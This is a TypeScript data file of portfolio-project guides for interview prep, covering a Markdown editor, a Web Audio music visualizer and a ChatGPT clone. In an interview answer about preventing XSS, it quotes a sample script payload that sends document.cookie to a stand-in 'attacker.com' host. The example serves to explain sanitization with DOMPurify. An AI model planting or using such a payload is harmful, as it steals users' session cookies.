        impact: 'Marked.js handles \\r\\n correctly, but some textarea operations (word count, cursor positioning) may produce off-by-one counts when treating \\r\\n as two characters.',
        mitigation: 'Normalize line endings on file import: content.replace(/\\r\\n/g, "\\n"). This ensures consistent behavior across OS line ending conventions.',
      },
      {
        scenario: 'localStorage quota exceeded (5-10MB per origin)',
        impact: 'If a user has many large documents, localStorage.setItem() throws a QuotaExceededError that crashes the auto-save without user feedback.',
        mitigation: 'Wrap setItem in a try/catch. On failure, show a toast notification: "Storage full. Please export and delete old documents." Consider switching to IndexedDB (much larger quota) for document storage.',
      },
      {
        scenario: 'Drag handle moved to minimum width on mobile',
        impact: 'On small screens, a 50/50 split makes both panes too narrow. Users may accidentally drag the handle to 0%, hiding one pane entirely.',
        mitigation: 'Enforce a minimum pane width (e.g., 20%). On mobile (<768px), switch to a tabbed layout instead of a side-by-side split, with Edit and Preview tabs.',
      },
    ],
    interviewFollowups: [
      {
        question: 'How did you prevent XSS in the preview pane?',
        answer: 'I pipe all Markdown through a two-step process: marked() converts Markdown to HTML, then DOMPurify.sanitize() strips any unsafe content before it reaches the DOM. DOMPurify removes script tags, inline event handlers (onclick, onerror), and javascript: href values. I use React\'s dangerouslySetInnerHTML to render the sanitized HTML — the "dangerous" prop name is a reminder to always sanitize, which I document in a comment. Without DOMPurify, a user could embed <script>fetch("attacker.com", {body: document.cookie})</script> in their Markdown.',
      },
      {
        question: 'Why did you debounce at 200ms specifically?',
        answer: 'Human perception research shows delays under 100ms feel instantaneous, 100-300ms feel responsive, and above 300ms feels laggy. At 200ms, a fast typist (80 WPM = 6.7 chars/sec) triggers at most one parse per character burst. The preview updates fast enough to feel live without parsing on every single keystroke. For very large documents I would increase to 400ms or move parsing to a Web Worker entirely.',
      },
      {
        question: 'How does the scroll sync work and what are its limitations?',
        answer: 'I calculate the editor\'s scroll fraction: scrollTop / (scrollHeight - clientHeight). I apply that fraction to the preview: preview.scrollTop = fraction * (preview.scrollHeight - preview.clientHeight). This works well for documents where editor and preview have proportional layouts. It breaks for documents with large images (preview is much taller than editor near the image) or collapsible sections. A more accurate approach would parse the Markdown AST to map line numbers to rendered element positions, but proportional sync is good enough for 95% of documents.',
      },
      {
        question: 'How would you add collaborative editing to this?',
        answer: 'The core challenge is merging concurrent edits from multiple users. I would use Operational Transformation (OT) or CRDTs (Conflict-free Replicated Data Types) for the text synchronization. Yjs is a production-ready CRDT library with a Prosemirror/CodeMirror binding. For the transport layer, I would add a WebSocket server that broadcasts document operations. Each client applies remote operations and the CRDT guarantees convergence — all clients end up with the same document regardless of network order.',
      },
    ],
    extensionIdeas: [
      {
        idea: 'Web Worker Markdown Parsing',
        difficulty: 'intermediate',
        description: 'Move the marked() parse call into a Web Worker so large document parsing never blocks the main thread. The worker receives a Markdown string via postMessage and returns the HTML string. This keeps the editor responsive even for 100K+ character documents, and is a great demo of Web Workers in practice.',
      },
      {
        idea: 'Vim Keybindings Mode',
        difficulty: 'advanced',
        description: 'Implement a basic Vim mode (normal, insert, visual modes) with key mappings: hjkl navigation, i to enter insert, Esc to return to normal, w/b for word movement, dd to delete line, yy to yank. CodeMirror 6 has a Vim mode extension that can replace the raw textarea for this. A functioning Vim mode makes the editor genuinely impressive to developer audiences.',
      },
      {
        idea: 'Table of Contents Auto-Generation',
        difficulty: 'beginner',
        description: 'Parse the rendered HTML to extract all heading elements (h1-h6). Build a collapsible TOC sidebar that shows the document structure as a nested list. Clicking a heading scrolls the preview to that element. This is a common feature in documentation editors and adds clear navigational value to long documents.',
      },
      {
        idea: 'Export to PDF via Print CSS',
        difficulty: 'beginner',
        description: 'Add a Print/PDF button that opens the preview in a new window with print-optimized CSS (proper page breaks, no UI chrome). The user prints to PDF using their browser\'s print dialog. Alternatively, use the browser\'s window.print() API directly on the preview pane. A more advanced approach uses a headless browser library, but the CSS print approach requires zero dependencies.',
      },
    ],
  },
  {
    id: 'music-visualizer',
    title: 'Music Visualizer',
    icon: 'music',
    color: '#ec4899',
    difficulty: 'intermediate',
    estimatedTime: '5-6 hours',
    techStack: ['React', 'TypeScript', 'Web Audio API', 'Canvas/WebGL'],
    questions: 4,
    description: 'Build a music visualizer that analyzes audio in real time using the Web Audio API and renders frequency spectrum, waveform, and particle effects on canvas.',
    introduction: 'Create an audio-reactive visual experience. Users upload a song or use microphone input, and the visualizer renders real-time frequency bars, waveform oscilloscopes, and particle systems that react to beat detection. This project showcases advanced browser APIs and creative coding.',
    interviewRelevance: 'Demonstrates mastery of Web Audio API, Canvas/WebGL rendering, requestAnimationFrame loops, and creative problem-solving. Impressive in any portfolio because it is visual, interactive, and technically deep.',
    learningObjectives: [
      'Use the Web Audio API (AudioContext, AnalyserNode) to extract frequency and time-domain data',
      'Render frequency bar charts and waveform oscilloscopes on HTML Canvas',
      'Implement beat detection using energy comparison across frequency bands',
      'Build a particle system that reacts to audio amplitude and frequency',
    ],
    keyQuestions: [
      { question: 'How does the Web Audio API work?', answer: 'Create an AudioContext, connect the audio source to an AnalyserNode, then call getByteFrequencyData() each frame to get a Uint8Array of frequency amplitudes (0-255). Each array index represents a frequency band. Use this data to drive your visualizations.' },
      { question: 'How do I detect beats?', answer: 'Compare the current average energy of the bass frequency bands (0-10) against the running average over the last ~43 frames (1 second at 43fps). If current energy exceeds the average by a threshold (e.g., 1.5x), it is a beat. Use this to trigger visual effects like flashes or particle bursts.' },
      { question: 'Canvas or WebGL?', answer: 'Start with Canvas 2D for simplicity — it handles frequency bars and waveforms easily. If you want 3D visuals or particle systems with 10K+ particles, switch to WebGL (Three.js). Canvas 2D can handle 500-1000 particles at 60fps.' },
      { question: 'How do I handle different audio sources?', answer: 'Support three inputs: file upload (create an Audio element, connect via createMediaElementSource), microphone (getUserMedia, connect via createMediaStreamSource), and URL streaming. Each connects to the same AnalyserNode pipeline.' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Audio Pipeline Setup',
        description: 'Build the Web Audio API signal chain: source node → AnalyserNode → destination, and wire up file upload and microphone input.',
        tasks: [
          'Create an AudioContext on user gesture (required by browser autoplay policy)',
          'Build an AnalyserNode with fftSize 2048, connect it between the source and destination',
          'Implement file upload: create an <audio> element, connect via createMediaElementSource(audioElement)',
          'Implement microphone input: call getUserMedia({ audio: true }), connect via createMediaStreamSource(stream)',
          'Expose getFrequencyData() and getTimeDomainData() as hooks that call analyser.getByteFrequencyData() and analyser.getByteTimeDomainData()',
        ],
      },
      {
        phase: 2,
        title: 'Frequency Bar Visualizer',
        description: 'Render a frequency spectrum bar chart on HTML Canvas that updates every animation frame.',
        tasks: [
          'Set up a canvas element with useRef, size it to match its CSS dimensions via devicePixelRatio for crisp rendering',
          'Start a requestAnimationFrame loop in a useEffect; store the animation frame ID in a ref for cleanup',
          'On each frame, call getFrequencyData() to get a Uint8Array of 1024 frequency bins (0-255)',
          'Draw bars: divide canvas width by bin count for bar width, map bin value (0-255) to bar height percentage',
          'Color bars with a gradient from bass (red) to treble (blue), or hue-shift based on frequency index',
        ],
      },
      {
        phase: 3,
        title: 'Waveform Oscilloscope & Beat Detection',
        description: 'Add a time-domain waveform renderer and implement energy-based beat detection.',
        tasks: [
          'Add a second canvas for the waveform oscilloscope using getTimeDomainData() (values 0-255, center at 128)',
          'Draw the waveform as a continuous line: moveTo first point, lineTo each subsequent sample',
          'Implement beat detection: average the first 10 frequency bins (bass band), compare to a rolling 43-frame average',
          'Trigger a beat event when current bass energy exceeds the rolling average by 1.5x',
          'On beat: flash background color, scale the bar chart up briefly using a CSS scale transform or canvas scale()',
        ],
      },
      {
        phase: 4,
        title: 'Particle System & Polish',
        description: 'Add an audio-reactive particle system and final UI controls.',
        tasks: [
          'Build a Particle class with position, velocity, life, size, and color properties',
          'Spawn N particles per beat at random positions, with initial velocity proportional to beat energy',
          'Update particles each frame: apply velocity, decay life, fade alpha as life decreases',
          'Add visualizer mode selector: Bars, Waveform, Particles, Combined',
          'Add playback controls: play/pause, seek bar, volume slider, and a file name display',
        ],
      },
    ],
    fileStructure: `music-visualizer/
├── src/
│   ├── audio/
│   │   ├── AudioEngine.ts      # AudioContext, AnalyserNode setup and management
│   │   ├── beatDetection.ts    # rolling average energy comparison
│   │   └── audioSources.ts     # file upload, microphone, URL source helpers
│   ├── visualizers/
│   │   ├── FrequencyBars.ts    # canvas frequency bar renderer
│   │   ├── Waveform.ts         # canvas oscilloscope renderer
│   │   ├── ParticleSystem.ts   # particle class + update/render loop
│   │   └── index.ts            # visualizer registry
│   ├── components/
│   │   ├── Canvas.tsx          # shared canvas component with resize handling
│   │   ├── AudioControls.tsx   # play/pause, seek, volume
│   │   ├── SourceSelector.tsx  # file upload / mic input toggle
│   │   ├── VisualizerSelector.tsx
│   │   └── SettingsPanel.tsx   # fftSize, color scheme, sensitivity
│   ├── hooks/
│   │   ├── useAudioEngine.ts   # audio context lifecycle, source switching
│   │   ├── useAnimationLoop.ts # rAF loop with cleanup
│   │   └── useBeatDetection.ts # rolling average, beat event emitter
│   ├── types/
│   │   └── index.ts
│   ├── App.tsx
│   └── main.tsx
├── vite.config.ts
├── tailwind.config.ts
└── package.json`,
    architectureLayers: [
      {
        name: 'Audio Pipeline Layer (AudioEngine)',
        description: 'Manages the Web Audio API graph: AudioContext → source node → AnalyserNode → destination. Handles source switching (file vs microphone) without recreating the context. Exposes getFrequencyData() and getTimeDomainData() accessors that return typed array views into the analyser\'s output buffers.',
      },
      {
        name: 'Beat Detection Layer',
        description: 'Runs inside the animation loop. Maintains a circular buffer of the last 43 bass-band energy readings (one second at 43fps). On each frame, compares the current bass energy to the buffer average. Emits a beat event when the ratio exceeds the configurable threshold. Downstream visualizers subscribe to beat events to trigger effects.',
      },
      {
        name: 'Animation Loop Layer (useAnimationLoop)',
        description: 'Owns the requestAnimationFrame loop. On each frame: reads audio data, runs beat detection, then calls each active visualizer\'s draw(ctx, data) method. Stores the rAF ID in a ref and cancels it on component unmount to prevent memory leaks and zombie loops.',
      },
      {
        name: 'Visualizer Layer',
        description: 'Each visualizer is a standalone module implementing a draw(ctx, frequencyData, timeDomainData, beatInfo) interface. FrequencyBars maps frequency bins to bar heights. Waveform draws time-domain samples as a polyline. ParticleSystem maintains a pool of Particle objects and updates physics each frame. All visualizers render to the same canvas context.',
      },
      {
        name: 'React UI Layer',
        description: 'React components manage the non-animated UI: source selection, playback controls, visualizer picker, and settings. The canvas is a single ref-accessed DOM element that bypasses React rendering entirely — React never re-renders the canvas content, only the surrounding UI controls.',
      },
    ],
    codeExamples: {
      typescript: `// audio/AudioEngine.ts
export class AudioEngine {
  private ctx: AudioContext;
  private analyser: AnalyserNode;
  private source: AudioNode | null = null;
  private freqBuffer: Uint8Array;
  private timeBuffer: Uint8Array;

  constructor(fftSize = 2048) {
    this.ctx = new AudioContext();
    this.analyser = this.ctx.createAnalyser();
    this.analyser.fftSize = fftSize;
    this.analyser.smoothingTimeConstant = 0.8; // 0=no smoothing, 1=max
    this.analyser.connect(this.ctx.destination);
    // fftSize/2 bins — frequency resolution = sampleRate / fftSize
    this.freqBuffer = new Uint8Array(this.analyser.frequencyBinCount);
    this.timeBuffer = new Uint8Array(this.analyser.fftSize);
  }

  async connectMicrophone(): Promise<void> {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    this.disconnectSource();
    this.source = this.ctx.createMediaStreamSource(stream);
    this.source.connect(this.analyser);
  }

  connectAudioElement(el: HTMLAudioElement): void {
    this.disconnectSource();
    this.source = this.ctx.createMediaElementSource(el);
    this.source.connect(this.analyser);
    this.source.connect(this.ctx.destination);
  }

  getFrequencyData(): Uint8Array {
    this.analyser.getByteFrequencyData(this.freqBuffer);
    return this.freqBuffer; // reused buffer — don't store reference
  }

  getTimeDomainData(): Uint8Array {
    this.analyser.getByteTimeDomainData(this.timeBuffer);
    return this.timeBuffer;
  }

  private disconnectSource() {
    this.source?.disconnect();
    this.source = null;
  }
}

// audio/beatDetection.ts
export function createBeatDetector(historyLength = 43) {
  const history = new Float32Array(historyLength);
  let idx = 0;

  return function detectBeat(freqData: Uint8Array, threshold = 1.5): boolean {
    // Sum the first 10 bins (bass frequencies ~0-430Hz at 44.1kHz)
    let energy = 0;
    for (let i = 0; i < 10; i++) energy += freqData[i];
    const current = energy / 10;

    // Rolling average of recent frames
    const avg = history.reduce((s, v) => s + v, 0) / historyLength;
    history[idx % historyLength] = current;
    idx++;

    return avg > 10 && current > avg * threshold;
  };
}`,
    },
    tradeoffDecisions: [
      {
        choice: 'Canvas 2D vs WebGL for rendering',
        picked: 'Canvas 2D for MVP, with a note on WebGL for scaling',
        reason: 'Canvas 2D handles frequency bars and waveforms with simple, readable code. It supports up to ~1000 particles at 60fps. WebGL requires shader code (GLSL) and a much steeper learning curve, but unlocks tens of thousands of particles and 3D visuals. For a portfolio project, Canvas 2D shows the concepts clearly; mention WebGL (Three.js) as the path to scaling up particle effects.',
      },
      {
        choice: 'fftSize of 2048 vs 256 vs 8192',
        picked: 'fftSize 2048',
        reason: 'fftSize determines frequency resolution: higher = more bins = finer frequency detail, but also more latency (larger FFT window). fftSize 256 gives 128 bins — too coarse for interesting visualizations. fftSize 2048 gives 1024 bins — fine enough to distinguish individual notes, with acceptable 46ms latency. fftSize 8192 is overkill for visualizations and adds 185ms latency.',
      },
      {
        choice: 'Reusing Uint8Array buffers vs copying on each frame',
        picked: 'Reuse the same Uint8Array (mutate in place)',
        reason: 'getByteFrequencyData() writes into an existing buffer in-place. If you copy the buffer each frame (new Uint8Array(analyser.frequencyBinCount) every rAF), you generate 60 GC allocations per second. The reused buffer approach is zero-allocation per frame. The trade-off: you must consume the data in the same frame tick before the next getByteFrequencyData() call overwrites it.',
      },
      {
        choice: 'AudioContext creation on page load vs on first user gesture',
        picked: 'On first user gesture (button click)',
        reason: 'Browsers block AudioContext creation before a user gesture (click, tap, keypress) to prevent autoplay abuse. Creating it on page load silently enters a "suspended" state and audio will not play. Creating on button click guarantees the context starts in a "running" state. This is a hard browser constraint, not a design choice.',
      },
    ],
    deepDiveTopics: [
      {
        topic: 'How the Web Audio API signal graph works',
        detail: 'The Web Audio API is a directed graph of AudioNode objects. Source nodes (MediaElementSource, MediaStreamSource, OscillatorNode) generate audio. Processing nodes (AnalyserNode, GainNode, BiquadFilterNode) transform or inspect audio. The destination node (ctx.destination) outputs to speakers. You build the graph by calling node.connect(nextNode). The AnalyserNode is a "tap" — it passes audio through unchanged while also exposing FFT data via getByteFrequencyData(). All processing happens off the main thread in the browser\'s audio worklet.',
      },
      {
        topic: 'Fast Fourier Transform and frequency bins',
        detail: 'The AnalyserNode applies an FFT to the time-domain audio signal to produce a frequency-domain representation. fftSize determines how many time-domain samples are analyzed per frame. frequencyBinCount = fftSize / 2 is the number of output frequency buckets. At a sample rate of 44,100Hz with fftSize 2048, each bin covers 44100/2048 ≈ 21.5Hz. Bin 0 = 0-21.5Hz (sub-bass), bin 10 = 215Hz (bass), bin 50 = 1075Hz (midrange), bin 512 = 11kHz (treble). This is why bass beats show up in the first 10-20 bins.',
      },
      {
        topic: 'Energy-based beat detection vs onset detection',
        detail: 'Simple energy beat detection works well for music with clear kick drums. It compares instantaneous bass energy to a rolling average and fires when energy spikes above the threshold. More sophisticated onset detection uses spectral flux — the sum of positive changes across all frequency bins between consecutive frames. Spectral flux detects note onsets (any instrument starting), not just bass hits. For a visualizer, energy detection is sufficient and much simpler. Mention spectral flux as the production approach.',
      },
      {
        topic: 'smoothingTimeConstant and temporal averaging',
        detail: 'The AnalyserNode has a smoothingTimeConstant property (0 to 1). At 0, each FFT frame is independent — raw and jittery. At 1, the output is a running average over many frames — very smooth but slow to respond. At 0.8 (the default), the effective formula is: output[i] = 0.8 * previous[i] + 0.2 * current[i]. For a visualizer, 0.7-0.8 gives a natural smoothness. For beat detection, you want low smoothing (0.3-0.5) so beats register as sharp spikes, not gradual rises.',
      },
    ],
    commonPitfalls: [
      {
        pitfall: 'Creating AudioContext before a user gesture',
        why: 'Browsers enforce an autoplay policy: AudioContext starts in a "suspended" state if created without a preceding user gesture. Audio plays silently with no error. The visualizer appears to work (no crashes) but shows a flat line because no audio data flows.',
        solution: 'Create the AudioContext inside a click handler (the "Start" or "Upload" button). Check ctx.state === "suspended" and call ctx.resume() if needed. Show a "Click to start audio" prompt if the context is suspended.',
      },
      {
        pitfall: 'Not canceling the animation frame on component unmount',
        why: 'If the component unmounts (user navigates away) while the rAF loop is running, the loop continues indefinitely. Each frame calls getFrequencyData() on the analyser, reads canvas refs, and calls setState — all on a dead component. This causes memory leaks and "setState on unmounted component" warnings.',
        solution: 'Store the rAF ID in a useRef. In the useEffect cleanup function, call cancelAnimationFrame(animFrameRef.current). Also close the AudioContext: ctx.close().',
      },
      {
        pitfall: 'Canvas renders at CSS size instead of physical pixel size',
        why: 'A canvas element sized to 800x400 via CSS but with width/height attributes of 800x400 on a 2x retina display renders at half resolution — blurry on high-DPI screens.',
        solution: 'Set canvas.width = rect.width * devicePixelRatio and canvas.height = rect.height * devicePixelRatio. Then ctx.scale(devicePixelRatio, devicePixelRatio) to scale drawing operations back to CSS pixels. This produces crisp rendering on retina displays.',
      },
      {
        pitfall: 'Connecting the same audio element to two MediaElementSource nodes',
        why: 'A single HTMLAudioElement can only be connected to one MediaElementSource. Calling createMediaElementSource() on an already-connected element throws: "HTMLMediaElement already connected previously to a different MediaElementSourceNode".',
        solution: 'Store the MediaElementSource in a ref. When the user uploads a new file, disconnect the old source and reuse the existing audio element by changing its src, rather than creating a new MediaElementSource.',
      },
    ],
    edgeCases: [
      {
        scenario: 'User denies microphone permission',
        impact: 'getUserMedia() rejects with a NotAllowedError. Without a catch block, this is an unhandled promise rejection. The UI shows no feedback and appears broken.',
        mitigation: 'Wrap getUserMedia in try/catch. On NotAllowedError, show a user-facing message: "Microphone access denied. Please allow microphone access in your browser settings." Disable the microphone button and keep file upload available.',
      },
      {
        scenario: 'Audio file with no audio track (e.g., silent video)',
        impact: 'The AudioContext plays the file, the analyser runs, but all frequency bins return 0. The visualizer shows a flat line with no animation.',
        mitigation: 'Detect a flat visualizer after 2 seconds of play (check if all frequency bin values are below 5). Show a warning: "No audio detected. The file may be silent." This is rare but good defensive programming.',
      },
      {
        scenario: 'Very long audio file (2+ hours)',
        impact: 'When connecting an <audio> element via createMediaElementSource, the browser may attempt to decode the entire file into memory, causing a multi-second freeze or out-of-memory crash.',
        mitigation: 'The <audio> element with createMediaElementSource streams audio — it does not decode the whole file upfront. This is a common misconception. The full-file issue only occurs with createBufferSource (which requires AudioContext.decodeAudioData on the entire file). Stick with MediaElementSource for file playback.',
      },
      {
        scenario: 'Browser tab becomes background (hidden)',
        impact: 'Chrome throttles requestAnimationFrame to 1fps for hidden tabs. The visualizer freezes visually but audio continues playing. When the tab returns to focus, the rAF loop resumes and audio/visual sync is maintained because the analyser always returns current-frame data.',
        mitigation: 'This is acceptable behavior — no action needed. Optionally listen to document.visibilitychange and pause the visualizer when hidden to save CPU.',
      },
    ],
    interviewFollowups: [
      {
        question: 'Explain the Web Audio API signal graph you built.',
        answer: 'The graph flows: AudioSource → AnalyserNode → AudioContext.destination. For file playback, the source is a MediaElementSourceNode wrapping an <audio> element. For microphone, it is a MediaStreamSourceNode from getUserMedia. The AnalyserNode is a transparent pass-through that also exposes FFT frequency data and time-domain waveform data via getByteFrequencyData() and getByteTimeDomainData(). The destination is the speaker output. All processing happens off the main thread in the browser\'s audio worklet thread.',
      },
      {
        question: 'How does your beat detection work?',
        answer: 'I take the first 10 frequency bins from the AnalyserNode output — these cover roughly 0-215Hz, the bass frequency range where kick drums and bass lines live. I average those 10 bin values to get the current bass energy. I maintain a rolling circular buffer of the last 43 readings (about one second at 43fps). If the current energy exceeds the buffer average by more than 1.5x, I fire a beat event. The threshold and history length are configurable. For more sophisticated detection, I would implement spectral flux — tracking energy changes across ALL frequency bins to catch any instrument onset, not just bass.',
      },
      {
        question: 'Why does your canvas look blurry on a MacBook retina display?',
        answer: 'This is the device pixel ratio problem. A retina display has 2 physical pixels per CSS pixel. If I set canvas.width = 800 in CSS but the canvas attribute is also 800, I am rendering at half the display resolution — the browser upscales by 2x and the result is blurry. The fix: set canvas.width = rect.width * window.devicePixelRatio (e.g., 1600 on a 2x display), and ctx.scale(devicePixelRatio, devicePixelRatio) so drawing coordinates still use CSS pixel units. This is the same reason images need 2x srcset on retina displays.',
      },
      {
        question: 'What would you need to change to add 3D particle effects?',
        answer: 'Replace the Canvas 2D renderer with Three.js. Each particle becomes a Three.js Points object (a BufferGeometry with a PointsMaterial). The particle positions are stored in a Float32Array attribute and updated on the GPU each frame via bufferAttribute.needsUpdate = true. Three.js handles the WebGL boilerplate (shader compilation, VAO setup, transform matrices). The beat detection and audio data pipeline stay identical — I just feed the frequency data into the Three.js animation loop instead of the Canvas 2D loop. Canvas 2D tops out around 2000 particles; Three.js handles 100,000+ at 60fps.',
      },
    ],
    extensionIdeas: [
      {
        idea: '3D Particle System with Three.js',
        difficulty: 'advanced',
        description: 'Replace the Canvas 2D particle system with a Three.js BufferGeometry-based particle cloud. Particles orbit a central sphere, respond to beat events with velocity bursts, and use a vertex shader to color particles based on their distance from the center. Supports 50,000+ particles at 60fps versus Canvas 2D\'s ~1000 limit.',
      },
      {
        idea: 'Circular / Radial Frequency Visualizer',
        difficulty: 'intermediate',
        description: 'Instead of horizontal bars, render frequency bins as radial spokes emanating from the center of a circle. Bass frequencies appear at the bottom (6 o\'clock), treble at the top (12 o\'clock). The result looks like a blooming flower that pulses with the music. Add a mirrored variant for symmetry.',
      },
      {
        idea: 'Karaoke Mode with WebVTT Lyrics Sync',
        difficulty: 'advanced',
        description: 'Accept a .vtt (WebVTT) subtitle file alongside the audio file. Parse the timestamp cues and display the current lyric line centered over the visualizer, with word-by-word highlight synced to the audio playhead. Creates a full karaoke experience on top of the existing visualizer.',
      },
      {
        idea: 'Multiple Visualizer Panels',
        difficulty: 'intermediate',
        description: 'Split the screen into 4 quadrants, each showing a different visualizer (bars, waveform, particles, spectrogram). All four update from the same AnalyserNode data in the same rAF loop. Add a fullscreen toggle per panel. This turns the app into a multi-view audio analysis tool, which is impressive for a portfolio demo.',
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // TAKE-HOME PROJECTS
  // ═══════════════════════════════════════════════════════════
  {
    id: 'chatgpt-clone',
    title: 'ChatGPT Clone',
    icon: 'messageSquare',
    color: '#f59e0b',
    difficulty: 'intermediate',
    estimatedTime: '6-8 hours',
    techStack: ['React', 'Next.js', 'TypeScript', 'Python', 'Docker', 'WebSocket'],
    questions: 5,
    description: 'Build a full-stack ChatGPT clone with real-time streaming responses, conversation history, and multiple chat sessions.',
    introduction: 'Create a chat application that mimics ChatGPT\'s core UX: streaming AI responses, markdown rendering, code syntax highlighting, conversation history, and session management. This is the most common AI-related take-home project in 2024-2026.',
    interviewRelevance: 'The #1 take-home project for AI/ML and full-stack roles. Tests your ability to build real-time streaming UIs, handle WebSocket/SSE communication, manage complex state across sessions, and integrate with AI APIs.',
    learningObjectives: [
      'Build a streaming chat UI with token-by-token response rendering',
      'Implement WebSocket or SSE backend for real-time communication',
      'Create conversation management: multiple sessions, rename, delete, search',
      'Add message features: markdown rendering, code blocks with copy, image upload',
      'Build a Python backend that proxies to OpenAI/Claude API with streaming',
    ],
    keyQuestions: [
      { question: 'WebSocket vs SSE for streaming?', answer: 'SSE (Server-Sent Events) is simpler and sufficient for chat: the server streams tokens to the client. WebSocket is bidirectional and better if you need features like typing indicators or real-time collaboration. Most ChatGPT clones use SSE because the communication is primarily server→client.' },
      { question: 'How do I implement token-by-token streaming?', answer: 'Backend: use the AI API\'s streaming mode (stream=True). Forward each chunk via SSE (text/event-stream). Frontend: use fetch() with response.body.getReader(), decode chunks, and append to the message state. Use a ref to avoid re-rendering on every token.' },
      { question: 'How should I store conversation history?', answer: 'For a take-home: localStorage or IndexedDB is sufficient. For production: PostgreSQL with tables for conversations (id, title, created_at) and messages (id, conversation_id, role, content, created_at). Send conversation context as the AI API messages array.' },
      { question: 'What features make a ChatGPT clone stand out?', answer: 'Beyond basics: code syntax highlighting with copy button, LaTeX math rendering, image generation/upload, conversation search, keyboard shortcuts (Cmd+K for new chat, Cmd+/ for settings), dark/light theme, and response regeneration.' },
      { question: 'How do I handle the Docker requirement?', answer: 'Create a docker-compose.yml with two services: frontend (Node.js) and backend (Python). Share an .env file for API keys. Add a Makefile with commands: make dev, make build, make test. Include a clear README with one-command setup: docker-compose up.' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Project Scaffold & Docker',
        description: 'Set up the monorepo structure with Next.js frontend, FastAPI backend, and Docker Compose configuration so both services start with a single command.',
        tasks: [
          'Initialize Next.js 14 app with TypeScript in /frontend',
          'Create FastAPI app in /backend with requirements.txt (fastapi, uvicorn, openai, python-dotenv)',
          'Write docker-compose.yml with frontend (port 3000) and backend (port 8000) services',
          'Configure CORS in FastAPI to allow requests from localhost:3000',
          'Add .env.example with OPENAI_API_KEY placeholder and README quick-start',
        ],
      },
      {
        phase: 2,
        title: 'Database Schema & Conversation API',
        description: 'Design the PostgreSQL schema for conversations and messages, then build the REST endpoints for CRUD operations.',
        tasks: [
          'Create conversations table (id, title, created_at, updated_at) and messages table (id, conversation_id, role, content, created_at)',
          'Add SQLAlchemy models and Alembic migrations for both tables',
          'Implement GET /api/conversations and POST /api/conversations endpoints',
          'Build GET /api/conversations/:id/messages and DELETE /api/conversations/:id',
          'Write auto-title generation: first user message truncated to 40 chars',
        ],
      },
      {
        phase: 3,
        title: 'Streaming Chat Endpoint',
        description: 'Build the SSE streaming endpoint that proxies to the OpenAI API and streams tokens back to the client in real time.',
        tasks: [
          'Implement POST /api/chat/stream as an SSE endpoint (StreamingResponse)',
          'Send full conversation history as the messages array to OpenAI API with stream=True',
          'Forward each chunk via SSE data: {token}\\n\\n, close with data: [DONE]\\n\\n',
          'Persist the complete assistant message to the database after streaming ends',
          'Add error handling: 429 rate limit, 500 API errors with proper SSE error events',
        ],
      },
      {
        phase: 4,
        title: 'Chat UI & Polish',
        description: 'Build the streaming chat interface with markdown rendering, code highlighting, session sidebar, and final UX polish.',
        tasks: [
          'Build ChatMessage component with react-markdown + rehype-highlight for code blocks',
          'Implement useStream hook: fetch with ReadableStream, append tokens to state via useRef',
          'Create conversation sidebar with list, rename (double-click), and delete with confirmation',
          'Add auto-scroll-to-bottom with "scroll to bottom" button when user scrolls up',
          'Implement keyboard shortcuts: Cmd+Enter to send, Cmd+K for new conversation',
        ],
      },
    ],
    fileStructure: `chatgpt-clone/
├── docker-compose.yml
├── Makefile
├── .env.example
├── README.md
├── frontend/
│   ├── Dockerfile
│   ├── package.json
│   ├── next.config.ts
│   ├── src/
│   │   ├── app/
│   │   │   ├── layout.tsx
│   │   │   ├── page.tsx
│   │   │   └── chat/[id]/page.tsx
│   │   ├── components/
│   │   │   ├── Sidebar.tsx
│   │   │   ├── ChatWindow.tsx
│   │   │   ├── ChatMessage.tsx
│   │   │   ├── MessageInput.tsx
│   │   │   └── StreamingIndicator.tsx
│   │   ├── hooks/
│   │   │   ├── useStream.ts
│   │   │   └── useConversations.ts
│   │   ├── lib/
│   │   │   └── api.ts
│   │   └── types/
│   │       └── index.ts
└── backend/
    ├── Dockerfile
    ├── requirements.txt
    ├── main.py
    ├── database.py
    ├── models.py
    ├── schemas.py
    └── routers/
        ├── conversations.py
        └── chat.py`,
    architectureLayers: [
      { name: 'Presentation Layer', description: 'Next.js App Router pages and React components — ChatWindow renders the message list, MessageInput manages the textarea, Sidebar lists all conversations with rename/delete actions.' },
      { name: 'Streaming Hook Layer', description: 'useStream custom hook wraps the native Fetch ReadableStream API to incrementally append token chunks to local state, decoupling SSE parsing from UI rendering.' },
      { name: 'API Client Layer', description: 'Typed fetch wrappers in lib/api.ts for all REST endpoints (conversation CRUD) and the streaming SSE endpoint, with error normalization and retry logic.' },
      { name: 'FastAPI Route Layer', description: 'Python routers handle HTTP requests, validate request bodies with Pydantic schemas, and delegate to service functions. SSE route uses StreamingResponse with an async generator.' },
      { name: 'AI Service Layer', description: 'Thin wrapper around the OpenAI SDK that builds the messages array from conversation history and yields token chunks from the streaming response, then persists the completed message.' },
      { name: 'Persistence Layer', description: 'PostgreSQL via SQLAlchemy ORM — conversations and messages tables. All queries are async (asyncpg driver) to avoid blocking the event loop during streaming.' },
    ],
    dataModel: {
      description: 'Two tables: conversations stores chat sessions with auto-generated titles, messages stores each turn with role (user/assistant) and content. Foreign key with CASCADE delete keeps cleanup simple.',
      schema: `-- Conversations: one row per chat session
CREATE TABLE conversations (
  id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  title       VARCHAR(100) NOT NULL DEFAULT 'New Chat',
  created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at  TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Messages: one row per turn (user or assistant)
CREATE TABLE messages (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  conversation_id UUID NOT NULL REFERENCES conversations(id) ON DELETE CASCADE,
  role            VARCHAR(10) NOT NULL CHECK (role IN ('user', 'assistant', 'system')),
  content         TEXT NOT NULL,
  created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX idx_messages_conversation_id ON messages(conversation_id, created_at);`,
    },
    apiDesign: {
      description: 'REST endpoints for conversation management plus one SSE streaming endpoint for chat. All endpoints return JSON except /chat/stream which returns text/event-stream.',
      endpoints: [
        { method: 'GET', path: '/api/conversations', response: 'Array of { id, title, created_at, updated_at } ordered by updated_at DESC' },
        { method: 'POST', path: '/api/conversations', response: '{ id, title, created_at } — creates empty conversation' },
        { method: 'GET', path: '/api/conversations/:id/messages', response: 'Array of { id, role, content, created_at } ordered chronologically' },
